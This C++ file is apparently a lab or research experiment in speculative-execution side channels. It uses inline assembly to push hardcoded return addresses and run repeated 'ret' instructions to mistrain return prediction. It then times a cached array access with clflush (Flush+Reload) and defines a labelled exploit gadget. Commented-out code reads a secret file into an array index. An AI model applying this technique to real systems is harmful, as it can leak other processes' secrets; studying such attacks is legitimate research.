#include "util.hpp"
#include <iostream>
#include <fstream>
#define secret 1232
#define nonsecret 21142

using namespace std;

char array[256*256];
int total = 0;

volatile int foo(){
	return 0;
}

inline void timeAndFlush(ADDR_PTR addr) {
	printAccessTime(addr);
	// clflush((void *)addr);
}

volatile void spacer2() {
	asm(
		".rept 1000;"
		"nop;"
		".endr;"
	);
}

void trickMe() {
	// while(1) {
	ADDR_PTR address, tmp;

	for (int i = 0; i < 1000; i++) {
		asm(
			"mov $0x0000555555554c74,%0;" "push %0;"
			"mov $0x0000555555554c73,%0;" "push %0;"
			"mov $0x0000555555554c72,%0;" "push %0;"
			"mov $0x0000555555554c71,%0;" "push %0;"
			"mov $0x0000555555554c70,%0;" "push %0;"
			"mov $0x0000555555554c6f,%0;" "push %0;"
			"mov $0x0000555555554c6e,%0;" "push %0;"
			"mov $0x0000555555554c6d,%0;" "push %0;"
			"mov $0x0000555555554c6c,%0;" "push %0;"
			"mov $0x0000555555554c6b,%0;" "push %0;"
			"mov $0x0000555555554c6a,%0;" "push %0;"
			"mov $0x0000555555554c69,%0;" "push %0;"
			"mov $0x0000555555554c68,%0;" "push %0;"
			"mov $0x0000555555554c67,%0;" "push %0;"
			"mov $0x0000555555554c66,%0;" "push %0;"
			"mov $0x0000555555554c65,%0;" "push %0;"
			".rept 16;"
			"ret;"
			".endr;"
			: "=r" (tmp)
			: "r" (address)
		);
	
		// timeAndFlush((ADDR_PTR)&array[secret]);
		total += measure_one_block_access_time((ADDR_PTR)&array[secret]);
		clflush((void *)&array[secret]);
	}
}

volatile void spacer() {
	asm(
		".rept 1000;"
		"nop;"
		".endr;"
	);
}

void exploit() { // this should be at the same VA as attacker:gadget()
	volatile int temp = array[secret];
}

int main(){
	clflush(&array[secret]);
	// clflush(&array[nonsecret]);

	trickMe();

	printf("avg time is %f\n", total/1000.0);

	// for(int i = 0; i < 10000; i++) {
	// 	printf("%u\n", times[i]);
	// }

	// string buffer;
	// char temp;
	// volatile int i = 0;

	// ifstream secretFile("secret");
	// if(secretFile.is_open()){
	// 	getline(secretFile, buffer);
	// 	secretFile.close();
	// }

	// string secret = buffer;
	// temp &= array[secret[i]*256]; // vulneralbility

	// while(true){
	// 	foo();
	// 	measureAccessTime();
	// }

	return 0;
}